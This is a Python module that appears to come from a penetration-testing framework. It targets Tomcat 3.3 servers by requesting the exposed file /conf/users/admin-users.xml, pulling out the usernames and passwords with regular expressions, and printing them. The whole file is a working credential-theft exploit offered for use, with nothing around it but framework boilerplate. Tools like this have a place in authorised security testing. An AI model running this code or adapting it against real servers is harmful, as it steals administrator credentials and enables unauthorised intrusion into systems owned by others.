from auxiliary import Auxiliary
from re import findall
from log import LOG
import utility

class Auxiliary:
    """ Tomcat 3.x allows traversing the local path, so we can use that to
    fetch credentials
    """

    def __init__(self):
        self.name = 'Fetch credentials'
        self.versions = ['3.3']
        self.flag = 'tc-ofetch' # someday there might be a real fetch...

    def check(self, fingerprint):
        if fingerprint.version in self.versions:
            return True
        return False

    def run(self, fingerengine, fingerprint):
        """ Simple fetch
        """

        utility.Msg("Fetching credentials...")
        base = 'http://{0}:{1}'.format(fingerengine.options.ip,
                                       fingerprint.port)
        uri = '/conf/users/admin-users.xml'

        response = utility.requests_get(base + uri)
        if response.status_code is 200:

           un = findall("name=\"(.*?)\"", response.content)
           pw = findall("password=\"(.*?)\"", response.content)
           if len(pw) > 0 and len(un) > 0:
               utility.Msg("Found credentials:")
               for (u, p) in zip(un, pw):
                   utility.Msg("\t%s:%s" % (u, p), LOG.SUCCESS)
